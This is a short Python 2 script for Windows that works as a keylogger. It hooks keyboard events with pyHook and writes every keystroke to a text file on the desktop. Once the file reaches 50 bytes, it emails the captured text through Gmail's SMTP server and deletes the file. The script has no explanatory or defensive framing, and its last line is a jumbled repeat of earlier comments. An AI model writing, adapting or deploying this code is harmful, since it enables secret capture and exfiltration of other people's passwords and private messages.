#!/usr/bin/python
#-*-coding:utf-8-*-
import pyHook,pythoncom
import sys
import smtplib
from email.mime.text import MIMEText
import os
 
#set debug level to zero
#connect to the server
#login to the server
smtp = smtplib.SMTP_SSL()
smtp.set_debuglevel(0)
smtp.connect('smtp.gmail.com',465)
smtp.ehlo()
smtp.login('EMAIL@gmail.com','PASSWORD')
 
from_address = 'EMAIL@gmail.com'
to_address = 'EMAIL@gmail.com'
 
print 'Logging all keystrokes...'
 
#actually logging keystrokes here
def OnKeyboardEvent(event):
    key = chr(event.Ascii)
    file = open('C:\Users\Eugene\Desktop\keystrokes.txt', 'a+')
    if event.Ascii == 13:
        key = " <return> "
    elif event.Ascii == 9:
        key = " <tab> "
    elif event.Ascii == 8:
        key = " <backspace> "
    if event.Key == 'Escape':
        sys.exit('Stopping the process.')
    file.write(key)
    file.close()
    send_message()
    return True
 
#creating a function to send the message when the file is over 50 characters
def send_message():
    file = open('C:\Users\Eugene\Desktop\keystrokes.txt', 'rb')
    msg = MIMEText(file.read())
    file.close()
    if os.stat('C:\Users\Eugene\Desktop\keystrokes.txt').st_size >= 50:
        print 'Sending to email'
        smtp.sendmail(from_address, to_address, msg.as_string())
        os.remove('C:\Users\Eugene\Desktop\keystrokes.txt')
 
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
#connect to the server #login to the server smtp = smtplib.SMTP_SSL()
